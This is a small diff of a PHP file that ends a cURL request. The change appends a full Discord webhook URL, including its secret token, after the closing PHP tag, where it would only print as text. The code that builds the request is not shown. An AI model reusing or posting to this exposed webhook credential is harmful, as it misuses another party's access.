@@ -86,4 +86,4 @@ curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt( $exec, CURLOPT_HEADER, 0);
 curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
 $response = curl_exec( $exec );
-?>
+?> https://discord.com/api/webhooks/1253470489939017758/VxTv9dW5JUi97EF7mbfNyuDeFRHt-0ynMjK-clWt3W5O_Iee45xXvN7M3d--_pO6WvBX
